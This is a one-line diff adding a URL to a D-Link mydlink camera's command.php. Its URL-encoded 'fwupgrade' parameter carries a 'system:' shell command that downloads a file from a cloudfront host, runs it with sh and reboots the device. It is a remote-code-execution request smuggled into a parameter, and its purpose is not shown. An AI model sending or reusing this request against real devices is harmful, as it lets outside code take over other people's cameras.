@@ -1,0 +1,1 @@
+http://rd-v2-signal.local.mydlink.com:81/command.php?no=71048796&fwupgrade=system%3A+curl+-o+%2Ftmp%2Ffw.bin+http%3A%2F%2Fd2okd4tdjucp2n.cloudfront.net%2FAuto_DCS-825L_A1_FW_v1.05.04.bin+%26%26+sh+%2Ftmp%2Ffw.bin+update+%26%26+reboot
